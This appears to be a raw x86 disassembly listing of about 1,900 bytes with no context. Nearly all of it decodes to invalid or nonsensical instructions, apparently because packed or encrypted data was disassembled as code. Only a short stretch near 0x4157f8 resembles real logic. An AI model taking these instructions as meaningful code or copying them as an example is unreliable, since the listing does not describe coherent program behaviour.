  4152b2:	in     eax,0x61
  4152b4:	add    eax,0x4651a360
  4152b9:	inc    ecx
  4152ba:	sar    DWORD PTR [edi],cl
  4152bc:	add    al,0x46
  4152be:	(bad)  
  4152bf:	imul   esp,DWORD PTR [eax],0x9c1c260d
  4152c5:	cmp    cl,BYTE PTR [eax]
  4152c7:	sub    BYTE PTR [edx],bl
  4152c9:	mov    ds:0x1b81205e,eax
  4152ce:	pushf  
  4152cf:	pusha  
  4152d0:	xlat   BYTE PTR ds:[ebx]
  4152d1:	sbb    DWORD PTR [edx+0x27138406],ebx
  4152d7:	or     DWORD PTR [ecx-0x4b],esi
  4152da:	fadd   st,st(3)
  4152dc:	out    0xf1,eax
  4152de:	arpl   WORD PTR [ebx-0x79],cx
  4152e1:	inc    edx
  4152e2:	adc    al,0x64
  4152e4:	sub    dh,dl
  4152e6:	in     eax,dx
  4152e7:	push   eax
  4152e8:	ror    BYTE PTR [ebp+0x6d2e7916],1
  4152ee:	inc    edi
  4152ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152f0:	jge    0x4152cf
  4152f2:	cs ins DWORD PTR es:[edi],dx
  4152f4:	sahf   
  4152f5:	inc    esi
  4152f6:	fs sahf 
  4152f8:	imul   esi,DWORD PTR [ebx-0x630aa10],0xe881e46
  415302:	mov    ds:0x3d6283c9,eax
  415307:	lock lahf 
  415309:	pop    ss
  41530a:	out    0x2b,eax
  41530c:	cmp    dh,cl
  41530e:	(bad)  
  41530f:	arpl   WORD PTR [ebx-0x25862f19],ax
  415315:	js     0x4152ee
  415317:	adc    al,ah
  415319:	xchg   ecx,eax
  41531a:	ins    DWORD PTR es:[edi],dx
  41531b:	and    al,0x4e
  41531d:	pop    edx
  41531e:	cwde   
  41531f:	dec    ebp
  415320:	cli    
  415321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415322:	inc    ebp
  415323:	mov    ds:0xcd147e3d,eax
  415328:	inc    esp
  415329:	ret    
  41532a:	aad    0x25
  41532c:	(bad)  
  41532d:	fsubr  DWORD PTR [eax+ecx*4-0x54]
  415331:	pushf  
  415332:	dec    ebx
  415333:	test   eax,0xfa477cd4
  415338:	retf   0xff9
  41533b:	stc    
  41533c:	in     eax,dx
  41533d:	mov    ds:0x2b3605ad,al
  415342:	dec    ebp
  415343:	pushf  
  415344:	add    BYTE PTR [ebx+0x7f47f83],ah
  41534a:	jmp    0x5a37:0x9f9827d6
  415351:	lods   eax,DWORD PTR ds:[esi]
  415352:	std    
  415353:	cmp    edx,DWORD PTR [esi-0x7f]
  415356:	shr    esp,0x9a
  415359:	xchg   BYTE PTR [eax+0x21],bh
  41535c:	mov    bl,0x71
  41535e:	fldcw  WORD PTR [eax]
  415360:	fisub  WORD PTR [esi+0x1b6230d2]
  415366:	pop    esi
  415367:	dec    ecx
  415368:	pop    eax
  415369:	mov    dh,BYTE PTR [edi+eax*4-0x3327a068]
  415370:	iret   
  415371:	mov    ds:0xd7e6f759,al
  415376:	jmp    0x7d55ec48
  41537b:	adc    edi,0xabb09f6e
  415381:	in     eax,dx
  415382:	inc    edi
  415383:	jmp    0xffc4:0x60ac89ed
  41538a:	addr16 ret 0x5d8f
  41538e:	xchg   edi,eax
  41538f:	pop    ecx
  415390:	inc    ebp
  415391:	adc    eax,0x19940a65
  415396:	scas   eax,DWORD PTR es:[edi]
  415397:	lock sar BYTE PTR [ebx+eax*8],1
  41539b:	and    eax,0xde47c563
  4153a0:	xlat   BYTE PTR ds:[ebx]
  4153a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153a2:	pusha  
  4153a3:	pop    ss
  4153a4:	mov    edx,0x8d89dab1
  4153a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153aa:	pop    ds
  4153ab:	fs jge 0x415369
  4153ae:	push   cs
  4153af:	push   esi
  4153b0:	push   eax
  4153b1:	inc    esi
  4153b2:	sti    
  4153b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153b4:	lahf   
  4153b5:	lahf   
  4153b6:	and    eax,0x700b2d6a
  4153bb:	push   0xadff5814
  4153c0:	adc    DWORD PTR [edi+0x586171bf],edx
  4153c6:	sbb    DWORD PTR [ecx+0x31],edi
  4153c9:	add    bh,BYTE PTR [eax]
  4153cb:	mov    ah,bl
  4153cd:	add    ebp,DWORD PTR [esi]
  4153cf:	(bad)  
  4153d0:	jno    0x415368
  4153d2:	push   edx
  4153d3:	out    0x5c,eax
  4153d5:	mov    cl,0x98
  4153d7:	mov    eax,0x93cce8a6
  4153dc:	scas   al,BYTE PTR es:[edi]
  4153dd:	xchg   esp,eax
  4153de:	mov    eax,ds:0xee204689
  4153e3:	inc    esi
  4153e4:	outs   dx,BYTE PTR ds:[esi]
  4153e5:	cmp    bl,BYTE PTR [eax-0x6c8e4959]
  4153eb:	aas    
  4153ec:	dec    edi
  4153ed:	loope  0x4153fb
  4153ef:	fmul   st,st(6)
  4153f1:	lods   eax,DWORD PTR ds:[esi]
  4153f2:	sub    al,0xaf
  4153f4:	or     DWORD PTR [edi+0x62],0xfffffff8
  4153f8:	xlat   BYTE PTR ds:[ebx]
  4153f9:	sbb    ecx,DWORD PTR [ebx+0x2375d4ad]
  4153ff:	jnp    0x41541d
  415401:	lds    ebx,FWORD PTR [edi+ebp*2]
  415404:	cmp    ebx,edi
  415406:	jbe    0x415404
  415408:	mov    ds,WORD PTR [esp+edx*1]
  41540b:	pop    ecx
  41540c:	jno    0x415409
  41540e:	jp     0x415456
  415410:	dec    ecx
  415411:	jge    0x415478
  415413:	xchg   edx,eax
  415414:	mov    esi,0x61461250
  415419:	dec    ecx
  41541a:	je     0x415471
  41541c:	in     al,dx
  41541d:	pop    ebp
  41541e:	pop    ss
  41541f:	cmp    eax,0xbd2d902a
  415424:	arpl   di,ax
  415426:	ds in  eax,dx
  415428:	pop    ebx
  415429:	add    bl,ah
  41542b:	xor    bl,BYTE PTR [esi+ebp*2+0x3b0e393]
  415432:	xchg   BYTE PTR [bx-0x46],bh
  415436:	cs enter 0x131,0x1c
  41543b:	lods   eax,DWORD PTR ds:[esi]
  41543c:	inc    edx
  41543d:	jp     0x41545c
  41543f:	pop    ss
  415440:	test   DWORD PTR [edx+esi*2-0x33f6d2b1],0x4496cc51
  41544b:	pop    ebp
  41544c:	cmp    edi,DWORD PTR [eax-0x422144fa]
  415452:	fistp  WORD PTR [ebx+0x10]
  415455:	ret    0xfc81
  415458:	mov    cl,0x13
  41545a:	fcomp  DWORD PTR [esi-0x5909c527]
  415460:	iret   
  415461:	outs   dx,BYTE PTR ds:[esi]
  415462:	sbb    BYTE PTR [edi+eax*1],dh
  415465:	push   edi
  415466:	iret   
  415467:	js     0x415499
  415469:	mov    esp,0x8cf126e3
  41546e:	xlat   BYTE PTR ds:[ebx]
  41546f:	and    ch,BYTE PTR [ecx-0x3]
  415472:	cmovae eax,DWORD PTR [eax+0x76]
  415476:	sbb    BYTE PTR ds:0x7f3efc8b,dl
  41547c:	fisub  DWORD PTR [edi+ecx*4-0x6fcec135]
  415483:	mov    bh,0xce
  415485:	and    eax,0x782026ed
  41548a:	pop    ds
  41548b:	mov    dl,0x82
  41548d:	bound  ebp,QWORD PTR [ebp+0x50]
  415490:	arpl   WORD PTR [edi+0x50],dx
  415493:	pop    ss
  415494:	xchg   esi,eax
  415495:	sbb    al,0x98
  415497:	adc    eax,0x7ed51b2e
  41549c:	enter  0xf4c1,0xe8
  4154a0:	hlt    
  4154a1:	lds    esp,FWORD PTR [edx+esi*1]
  4154a4:	mov    es,WORD PTR [ebp+0x40b1fb6f]
  4154aa:	mov    ecx,0xb4e1a8d6
  4154af:	mov    BYTE PTR [eax+0x213f27ed],0xaa
  4154b6:	mov    eax,0x8859bcb3
  4154bb:	(bad)  
  4154bc:	jecxz  0x415517
  4154be:	xor    BYTE PTR ds:0x49055398,cl
  4154c4:	lahf   
  4154c5:	clc    
  4154c6:	arpl   di,si
  4154c8:	adc    DWORD PTR [ecx+0x1e],esi
  4154cb:	mov    edx,0x7adb2b6a
  4154d0:	push   es
  4154d1:	jae    0x415478
  4154d3:	leave  
  4154d4:	js     0x4154de
  4154d6:	or     edi,eax
  4154d8:	mov    eax,ds:0x851100da
  4154dd:	repz mov ah,BYTE PTR [ebp-0x483b7dc9]
  4154e4:	pop    ecx
  4154e5:	sub    edi,DWORD PTR [esi-0x7eb9f080]
  4154eb:	mov    DWORD PTR [edi],ecx
  4154ed:	aam    0x80
  4154ef:	pop    edx
  4154f0:	xor    edi,DWORD PTR [ebx+ecx*2-0x24]
  4154f4:	cmp    BYTE PTR [ebp-0x69],0xfc
  4154f8:	sbb    dl,BYTE PTR [ebx]
  4154fa:	inc    eax
  4154fb:	les    esi,FWORD PTR [edi-0x72]
  4154fe:	or     esi,DWORD PTR [ebp+0x2021b1aa]
  415504:	inc    esp
  415505:	fs dec ebp
  415507:	jnp    0x4154dc
  415509:	adc    eax,edx
  41550b:	fidivr DWORD PTR [esi-0x4f]
  41550e:	dec    eax
  41550f:	cs pop ecx
  415511:	mov    ?,ebx
  415513:	pusha  
  415514:	pop    ebp
  415515:	shr    BYTE PTR [ecx],0x44
  415518:	dec    ecx
  415519:	xor    al,BYTE PTR [ebp+0x35]
  41551c:	xchg   ebp,eax
  41551d:	mov    BYTE PTR [edi],ch
  41551f:	bnd jb 0x4155a1
  415522:	fst    st(3)
  415524:	mov    BYTE PTR [ecx-0x15],al
  415527:	mov    edi,0xac8019d6
  41552c:	in     al,0x33
  41552e:	(bad)  
  41552f:	dec    ebx
  415530:	cwde   
  415531:	jno    0x415528
  415533:	call   0xed6a62b9
  415538:	in     eax,0xe5
  41553a:	aam    0xa
  41553c:	inc    ecx
  41553d:	lods   al,BYTE PTR ds:[esi]
  41553e:	lock jno 0x4155b7
  415541:	enter  0x5939,0x23
  415545:	or     al,0x73
  415547:	jmp    0x68043313
  41554c:	mov    esp,0x3562d7e5
  415551:	xor    BYTE PTR [ecx+0x7a9d29a5],dh
  415557:	cmp    ebx,esp
  415559:	cmp    eax,0x4d427b96
  41555e:	jmp    0x4154ff
  415560:	jno    0x4155dd
  415562:	lds    ecx,FWORD PTR [edi+ebx*2]
  415565:	retf   0xd5d3
  415568:	cmp    edx,DWORD PTR [eax-0x38c837e2]
  41556e:	in     al,dx
  41556f:	scas   al,BYTE PTR es:[edi]
  415570:	inc    ebp
  415571:	stos   BYTE PTR es:[edi],al
  415572:	cwde   
  415573:	jbe    0x4155cb
  415575:	std    
  415576:	pop    ebx
  415577:	mov    ds:0x5a42ff40,eax
  41557c:	and    edx,ebp
  41557e:	inc    ebx
  41557f:	inc    edx
  415580:	xchg   DWORD PTR [edi+0x7762c841],eax
  415586:	jnp    0x4155ef
  415588:	jmp    0xcb72:0x2ab3aee
  41558f:	in     al,dx
  415590:	mov    dh,0x34
  415592:	mov    al,ds:0xa9de71a6
  415597:	push   es
  415598:	in     eax,0xb3
  41559a:	js     0x4155a1
  41559c:	popf   
  41559d:	addr16 hlt 
  41559f:	jp     0x4155a8
  4155a1:	mov    ecx,0xda811745
  4155a6:	ins    BYTE PTR es:[edi],dx
  4155a7:	clc    
  4155a8:	cmc    
  4155a9:	mov    ah,0xed
  4155ab:	fistp  DWORD PTR [edi-0x7bc1ffcf]
  4155b1:	outs   dx,DWORD PTR ds:[esi]
  4155b2:	or     bl,ah
  4155b4:	push   cs
  4155b5:	mov    edx,0xf928e08b
  4155ba:	push   edx
  4155bb:	iret   
  4155bc:	pusha  
  4155bd:	jae    0x4155be
  4155bf:	jns    0x415628
  4155c1:	xchg   ecx,eax
  4155c2:	sub    dl,BYTE PTR [ebx-0x45]
  4155c5:	mov    esp,0x4b26e94c
  4155ca:	push   ecx
  4155cb:	push   ss
  4155cc:	jmp    DWORD PTR [esi+0x7d]
  4155cf:	test   al,0x21
  4155d1:	dec    ah
  4155d3:	shr    DWORD PTR [edi+0x29],1
  4155d6:	push   ebp
  4155d7:	xchg   edi,eax
  4155d8:	mov    ds:0x5d7060ac,eax
  4155dd:	jae    0x415620
  4155df:	out    0x29,eax
  4155e1:	mov    bh,0x56
  4155e3:	mov    fs,ebp
  4155e5:	lock leave 
  4155e7:	aas    
  4155e8:	pop    ebx
  4155e9:	arpl   WORD PTR [ecx-0x58c364af],ax
  4155ef:	cmp    eax,DWORD PTR [edx+eiz*1]
  4155f2:	ja     0x41563b
  4155f4:	ret    0x5e58
  4155f7:	jno    0x415610
  4155f9:	outs   dx,DWORD PTR ds:[esi]
  4155fa:	dec    edx
  4155fb:	dec    edi
  4155fc:	cmp    al,0xda
  4155fe:	aam    0xc1
  415600:	fwait
  415601:	xor    al,al
  415603:	and    al,BYTE PTR [edi]
  415605:	mov    dl,0x81
  415607:	and    ebp,esp
  415609:	lahf   
  41560a:	dec    edx
  41560b:	mov    cl,0x22
  41560d:	sbb    al,0x2e
  41560f:	jmp    0x415599
  415611:	test   al,0xa9
  415613:	(bad)  
  415614:	and    BYTE PTR [ebp+0x17],dl
  415617:	xlat   BYTE PTR ds:[ebx]
  415618:	iret   
  415619:	sahf   
  41561a:	into   
  41561b:	mov    edi,0x92541dae
  415620:	in     eax,0x2
  415622:	fs inc ebx
  415624:	int    0x1a
  415626:	adc    ah,dh
  415628:	test   DWORD PTR [eax-0x1f],esp
  41562b:	pop    ecx
  41562c:	dec    ecx
  41562d:	mov    ecx,0xf066e4d7
  415632:	pop    DWORD PTR [esi]
  415634:	dec    edx
  415635:	cs shl dh,0xa8
  415639:	(bad)  [esi+0x4fe218ac]
  41563f:	and    BYTE PTR [edi-0x68992a4],ch
  415645:	test   al,0x16
  415647:	scas   eax,DWORD PTR es:[edi]
  415648:	popa   
  415649:	add    bl,BYTE PTR [ebp-0x5d640d89]
  41564f:	add    dl,bh
  415651:	or     DWORD PTR [ebp+0x20932276],ebp
  415657:	fidivr WORD PTR [esi+0x3d]
  41565a:	dec    esp
  41565b:	ja     0x415681
  41565d:	pop    es
  41565e:	(bad)  
  415660:	fisttp DWORD PTR [eax]
  415662:	imul   edx,ebx,0x154d2b12
  415668:	dec    esi
  415669:	sbb    DWORD PTR [edi-0x70089856],edx
  41566f:	sti    
  415670:	xor    DWORD PTR [edx],ebp
  415672:	test   al,0xb2
  415674:	(bad)  
  415675:	pop    ebx
  415676:	jmp    0x834d13e8
  41567b:	xor    BYTE PTR [edx],cl
  41567d:	xchg   edi,eax
  41567e:	mov    eax,ds:0x4fedd20c
  415683:	cmp    eax,0x18692631
  415688:	retf   
  415689:	out    0x68,eax
  41568b:	xchg   edi,eax
  41568c:	in     eax,0x17
  41568e:	jnp    0x415695
  415690:	pop    esp
  415691:	out    0xc5,eax
  415693:	(bad)  
  415694:	cwde   
  415695:	mov    edx,0x3a7a3f4b
  41569a:	xor    ebx,DWORD PTR [edi]
  41569c:	lock lods al,BYTE PTR ds:[esi]
  41569e:	arpl   WORD PTR [eax+ebx*2+0x41],bx
  4156a2:	dec    edi
  4156a3:	cmp    BYTE PTR [edi+0x7f9b23c5],ch
  4156a9:	shr    BYTE PTR [edi],cl
  4156ab:	scas   al,BYTE PTR es:[edi]
  4156ac:	pop    eax
  4156ad:	cmp    DWORD PTR [ebx+0x2d4de9b8],ebp
  4156b3:	sbb    esi,DWORD PTR [esp+ebp*8-0x79]
  4156b7:	sti    
  4156b8:	loopne 0x4156aa
  4156ba:	dec    eax
  4156bb:	fsub   st(6),st
  4156bd:	loop   0x4156e9
  4156bf:	repz sti 
  4156c1:	cld    
  4156c2:	fild   DWORD PTR [eax+0x50]
  4156c5:	dec    edx
  4156c6:	int3   
  4156c7:	xchg   ecx,eax
  4156c8:	push   si
  4156ca:	sub    ah,BYTE PTR [ebx+esi*4-0x23d5ae9c]
  4156d1:	test   eax,0xa5f792f4
  4156d6:	sbb    eax,0x95e5edd5
  4156db:	shr    BYTE PTR [ecx-0x15],cl
  4156de:	inc    ebx
  4156df:	rol    BYTE PTR [esi-0x34],1
  4156e2:	add    BYTE PTR [edi+edx*4],0xd1
  4156e6:	rol    ah,1
  4156e8:	test   BYTE PTR fs:[esp+ecx*4],al
  4156ec:	aaa    
  4156ed:	ins    BYTE PTR es:[edi],dx
  4156ee:	mov    ds:0x6cecdb19,eax
  4156f3:	cmc    
  4156f4:	pusha  
  4156f5:	shl    DWORD PTR [ebp+0x20],1
  4156f8:	je     0x415767
  4156fa:	mov    eax,ds:0x13d36d48
  4156ff:	and    eax,DWORD PTR [edi-0x5f]
  415702:	arpl   WORD PTR [eax-0x17],dx
  415705:	mov    WORD PTR [edi],fs
  415707:	inc    edx
  415708:	mov    esi,0x33fcf503
  41570d:	add    al,BYTE PTR [ebx-0x6c]
  415710:	adc    dh,BYTE PTR [eax]
  415712:	mov    ecx,edx
  415714:	shl    edx,1
  415716:	xchg   edi,eax
  415717:	clc    
  415718:	add    BYTE PTR [eax+ebp*2],al
  41571b:	inc    BYTE PTR [esi]
  41571d:	add    BYTE PTR [esi],ah
  41571f:	sbb    dh,BYTE PTR [ebx+0x15]
  415722:	sbb    edx,esp
  415724:	sub    al,0xa0
  415726:	stos   DWORD PTR es:[edi],eax
  415727:	and    al,0x4d
  415729:	jb     0x415773
  41572b:	xchg   esp,eax
  41572c:	scas   al,BYTE PTR es:[edi]
  41572d:	sub    al,0x22
  41572f:	pop    ds
  415730:	es ins DWORD PTR es:[edi],dx
  415732:	jg     0x4156d7
  415734:	push   cs
  415735:	mul    WORD PTR [ecx+0x51]
  415739:	inc    esp
  41573a:	dec    ebp
  41573b:	mov    edx,0x7326cc86
  415740:	out    0x50,al
  415742:	int    0xd3
  415744:	jnp    0x415742
  415746:	xchg   esp,eax
  415747:	shl    BYTE PTR [ebx+0x5a9843a7],0x3
  41574e:	mov    eax,ds:0xe13df0b4
  415753:	inc    esi
  415754:	rcr    DWORD PTR es:[ecx-0x6003be80],1
  41575b:	dec    edx
  41575c:	(bad)  
  41575d:	out    dx,eax
  41575e:	or     DWORD PTR [esi+eiz*4],ebp
  415761:	int3   
  415762:	adc    eax,ebx
  415764:	mov    dh,0x43
  415766:	cli    
  415767:	cdq    
  415768:	mov    eax,0xe2e60519
  41576d:	cmc    
  41576e:	add    ebx,edx
  415770:	in     al,dx
  415771:	sub    DWORD PTR [ebp+ebx*8+0x71],0x9e839823
  415779:	xchg   bl,ch
  41577b:	std    
  41577c:	ret    0xffd5
  41577f:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  415781:	push   cs
  415782:	cmp    al,0xad
  415784:	pop    ebp
  415785:	popa   
  415786:	sub    eax,0x78cb2de8
  41578b:	sahf   
  41578c:	add    eax,0xdd8d48a4
  415791:	arpl   bx,cx
  415793:	push   esi
  415794:	pusha  
  415795:	hlt    
  415796:	sub    BYTE PTR [ebx-0x1c],cl
  415799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41579a:	js     0x415750
  41579c:	cmp    eax,0x10a12592
  4157a1:	enter  0xd2d2,0x8e
  4157a5:	mov    ebx,DWORD PTR [edx+ebp*8-0x3453ddec]
  4157ac:	lock mov ?,WORD PTR [edx-0x68]
  4157b0:	sar    DWORD PTR [ebp-0x74],1
  4157b3:	cmp    edi,DWORD PTR [edx-0xbfad6c]
  4157b9:	xchg   ecx,eax
  4157ba:	jns    0x41577d
  4157bc:	aas    
  4157bd:	adc    BYTE PTR [eax-0x76],al
  4157c0:	jmp    0xb293:0x4873e500
  4157c7:	xor    DWORD PTR [esi+0x40],edx
  4157ca:	adc    al,0xd1
  4157cc:	pusha  
  4157cd:	cmp    BYTE PTR [edx-0x3b11439],bl
  4157d3:	arpl   WORD PTR [ebx],dx
  4157d5:	xchg   DWORD PTR [ebp-0x7ad58c51],ebx
  4157db:	outs   dx,DWORD PTR ds:[esi]
  4157dc:	outs   dx,BYTE PTR ds:[esi]
  4157dd:	sub    eax,0xd6544277
  4157e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157e3:	pop    ds
  4157e4:	push   0x1e
  4157e6:	icebp  
  4157e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157e8:	pusha  
  4157e9:	outs   dx,DWORD PTR ds:[esi]
  4157ea:	xchg   edi,eax
  4157eb:	ja     0x4157a9
  4157ed:	int    0x87
  4157ef:	cli    
  4157f0:	sbb    al,0x65
  4157f2:	mov    edi,0xf9a67d29
  4157f7:	xchg   ecx,eax
  4157f8:	xor    edi,edx
  4157fa:	ds jmp 0x41582d
  4157fd:	xor    edx,0xba699573
  415803:	shrd   edx,edi,0x2
  415807:	shr    edi,0x2
  41580a:	or     edi,DWORD PTR [ebp+0x14]
  41580d:	xor    ecx,ecx
  41580f:	or     edx,ecx
  415811:	mov    ecx,DWORD PTR [ebx]
  415813:	mov    DWORD PTR [ebp-0x64],edi
  415816:	mov    edi,DWORD PTR [ebx+0x4]
  415819:	mov    edi,ecx
  41581b:	xor    ecx,ecx
  41581d:	shl    edi,0x1e
  415820:	jmp    0x415daa
  415825:	scas   al,BYTE PTR es:[edi]
  415826:	rcr    BYTE PTR ds:[ebx+0x20],0x59
  41582b:	and    al,0x32
  41582d:	ja     0x41587c
  41582f:	lods   al,BYTE PTR ds:[esi]
  415830:	scas   al,BYTE PTR es:[edi]
  415831:	js     0x4158a9
  415833:	(bad)  
  415834:	scas   al,BYTE PTR es:[edi]
  415835:	stc    
  415836:	mov    ebp,0x43d160c
  41583b:	push   ss
  41583c:	push   ss
  41583d:	rcl    BYTE PTR [ebp+eax*4+0x2d],1
  415841:	lea    edx,[ebx]
  415843:	mov    esi,0xf6d8e5bb
  415848:	fidivr DWORD PTR [ebx]
  41584a:	xchg   DWORD PTR [esi+0x65d1764],ebp
  415850:	push   esi
  415851:	out    0x3,al
  415853:	mov    ebx,0xeda60e31
  415858:	out    dx,al
  415859:	jle    0x41587d
  41585b:	adc    eax,0x7ffa00e7
  415860:	cmp    eax,0xc4503039
  415865:	push   edx
  415866:	jl     0x4158a5
  415868:	sub    al,0x69
  41586a:	mov    al,ds:0xd19f1542
  41586f:	xchg   ecx,eax
  415870:	add    esp,DWORD PTR [esi+0x7c]
  415873:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415874:	push   0x22
  415876:	ret    
  415877:	add    BYTE PTR [ebx+0x11],bh
  41587a:	mov    esp,0x5c186122
  41587f:	hlt    
  415880:	mov    dl,0xe2
  415882:	sahf   
  415883:	jge    0x415848
  415885:	in     eax,0x14
  415887:	(bad)  
  415889:	dec    edi
  41588a:	jmp    0x3021fab7
  41588f:	out    dx,al
  415890:	push   cs
  415891:	lods   eax,DWORD PTR ds:[esi]
  415892:	mov    bl,0x4
  415894:	mul    dl
  415896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415897:	mov    bl,BYTE PTR [ecx]
  415899:	xchg   DWORD PTR [ebp+0x57],ecx
  41589c:	neg    DWORD PTR [ebp-0x79]
  41589f:	into   
  4158a0:	cmp    al,0x86
  4158a2:	adc    bh,BYTE PTR [esi+ecx*4-0x26]
  4158a6:	scas   al,BYTE PTR es:[edi]
  4158a7:	xchg   esp,eax
  4158a8:	int3   
  4158a9:	add    al,0xc
  4158ab:	ss (bad) 
  4158ad:	mov    ah,0xeb
  4158af:	sub    bh,BYTE PTR [edx+0x1d]
  4158b2:	jle    0x415909
  4158b4:	outs   dx,BYTE PTR ds:[esi]
  4158b5:	pop    ebp
  4158b6:	iret   
  4158b7:	(bad)  
  4158b8:	pop    ecx
  4158b9:	bound  ebp,QWORD PTR [eax]
  4158bb:	jmp    0x8f9d:0x647ecca9
  4158c2:	bound  ecx,QWORD PTR [ebx+eax*2-0x4dba52ea]
  4158c9:	fs push ebp
  4158cb:	mov    ah,0x67
  4158cd:	jns    0x415855
  4158cf:	add    cl,BYTE PTR [ecx-0x3acdd9eb]
  4158d5:	dec    esp
  4158d6:	mov    ebx,0x79e5aec
  4158db:	icebp  
  4158dc:	mov    ebx,0x9be110a4
  4158e1:	cmp    bh,ch
  4158e3:	adc    bl,bh
  4158e5:	cmc    
  4158e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158e7:	jmp    0x85aef77c
  4158ec:	arpl   WORD PTR [edx+0x45],di
  4158ef:	stc    
  4158f0:	ds or  al,0x2
  4158f3:	loope  0x41593b
  4158f5:	pop    eax
  4158f6:	jge    0x415887
  4158f8:	cmp    cl,ch
  4158fa:	push   edx
  4158fb:	fadd   DWORD PTR [ebx]
  4158fd:	xchg   esp,eax
  4158fe:	mov    ds:0x2dc4e5de,al
  415903:	loop   0x415919
  415905:	pop    esp
  415906:	inc    ebp
  415907:	or     bl,ah
  415909:	ds and edx,0x8f666988
  415910:	sahf   
  415911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415912:	data16 icebp 
  415914:	call   0xe839:0x38a8db26
  41591b:	les    ebp,FWORD PTR [ecx-0x37]
  41591e:	mov    DWORD PTR [esi-0x40607c17],edx
  415924:	adc    BYTE PTR [edi-0x72de1402],al
  41592a:	dec    ebp
  41592b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41592c:	inc    ecx
  41592d:	xchg   ch,cl
  41592f:	jno    0x415967
  415931:	pcmpeqb mm4,QWORD PTR [edx-0x7c]
  415935:	call   0xd41c:0x583c775c
  41593c:	leave  
  41593d:	enter  0x3a25,0xfe
  415941:	test   BYTE PTR [ebx+0x44],ah
  415944:	pop    es
  415945:	mov    es,WORD PTR [ebp+0x5c]
  415948:	sbb    dh,BYTE PTR [edx]
  41594a:	dec    esp
  41594b:	adc    al,0xe1
  41594d:	mov    al,ds:0x24173e45
  415952:	push   esp
  415953:	xchg   ebx,eax
  415954:	sbb    esi,DWORD PTR [edi-0xc]
  415957:	push   ecx
  415958:	std    
  415959:	iret   
  41595a:	mov    bl,0x25
  41595c:	pop    ds
  41595d:	add    eax,0x70a89331
  415962:	mov    ah,0x94
  415964:	test   DWORD PTR [edx],0x95f6cd84
  41596a:	daa    
  41596b:	jnp    0x415928
  41596d:	or     DWORD PTR [edx],0x681bdee7
  415973:	lods   eax,DWORD PTR ds:[esi]
  415974:	gs pop eax
  415976:	(bad)  
  415977:	cmp    ecx,DWORD PTR [ecx]
  415979:	shl    ch,0x13
  41597c:	xchg   bh,bh
  41597e:	or     ecx,0xffffff9c
  415981:	cmp    BYTE PTR [eax+0xcdc2fac],0xb2
  415988:	xor    al,0xa4
  41598a:	cmp    al,0x7f
  41598c:	out    0x67,eax
  41598e:	addr16 sar eax,1
  415991:	cmp    al,0xc8
  415993:	dec    edx
  415994:	dec    edx
  415995:	push   0xffffffa0
  415997:	fisttp WORD PTR [ecx+ecx*8-0x4e846c7b]
  41599e:	xor    ebp,ebp
  4159a0:	push   esi
  4159a1:	fidiv  DWORD PTR [eax-0x9]
  4159a4:	inc    ebp
  4159a5:	add    BYTE PTR [edx+0x2f],bl
  4159a8:	cmp    bl,dl
  4159aa:	or     BYTE PTR [edi],0xe8
  4159ad:	test   bl,bl
  4159af:	mov    ds:0xa536b9f7,eax
  4159b4:	or     ebx,ecx
  4159b6:	and    al,0xc3
  4159b8:	fisttp QWORD PTR [esp+eax*1+0x1f]
  4159bc:	cli    
  4159bd:	cmp    ebx,eax
  4159bf:	inc    BYTE PTR [ebx+0x187d4b4c]
  4159c5:	add    eax,0x8f2356a3
  4159ca:	in     eax,dx
  4159cb:	inc    esi
  4159cc:	fsub   DWORD PTR [ebp+0x672d09d7]
  4159d2:	jg     0x415a14
  4159d4:	push   0x9f851118
  4159d9:	sbb    al,BYTE PTR [esi]
  4159db:	dec    esi
  4159dc:	ret    0x4a4d
  4159df:	xor    esp,DWORD PTR [ecx+0x1e]
  4159e2:	sub    DWORD PTR [ebx],edi
  4159e4:	rcl    BYTE PTR [esi],0xd8
  4159e7:	inc    edi
  4159e8:	dec    edi
  4159e9:	je     0x415a12
  4159eb:	inc    edi
  4159ec:	dec    ebp
  4159ed:	add    DWORD PTR [ecx],edi
  4159ef:	int    0x95
  4159f1:	push   esi
  4159f2:	(bad)  
  4159f4:	nop
  4159f5:	cld    
  4159f6:	int3   
  4159f7:	imul   esp,DWORD PTR [ebp+0x5439a97f],0xe4fd0c48
  415a01:	ja     0x41598a
  415a03:	test   DWORD PTR [esi+0x55dce20a],esp
  415a09:	nop
  415a0a:	popa   
  415a0b:	inc    edi
  415a0c:	push   esi
  415a0d:	in     al,dx
  415a0e:	mov    esi,0x1082802a
  415a13:	xor    eax,0x9f6b25f
  415a18:	test   BYTE PTR [edi],bh
  415a1a:	push   ebp
  415a1b:	ficomp WORD PTR [ebp+eiz*4+0x49]
  415a1f:	ror    BYTE PTR [ecx+0x77],0xd1
  415a23:	or     BYTE PTR [ecx],cl
  415a25:	mov    esp,0xbda5336e
  415a2a:	jno    0x415a9b
  415a2c:	push   eax
  415a2d:	out    0xea,eax
  415a2f:	fs ret 0xb214
  415a33:	das    
  415a34:	repnz adc eax,0xefabda18
  415a3a:	xchg   BYTE PTR [eax-0x76],ch
  415a3d:	xchg   esi,eax
  415a3e:	inc    eax
  415a3f:	sub    bl,0xce
  415a42:	pop    ds
  415a43:	clc    
  415a44:	fcmovu st,st(7)
  415a46:	in     al,dx
  415a47:	lods   al,BYTE PTR ds:[esi]
  415a48:	fldcw  WORD PTR [ecx+0x5e]
  415a4b:	inc    edi
  415a4c:	mov    esp,0x291e8459
  415a51:	jns    0x415aaa
  415a53:	aad    0x60
  415a55:	rep lods eax,DWORD PTR ds:[esi]
  415a57:	pop    edx
  415a58:	push   DWORD PTR [ebx+0x2ce3cb0a]
  415a5e:	mov    dh,0xc1
  415a60:	mov    BYTE PTR ds:0x16de01be,al
  415a66:	jmp    0x415a2a
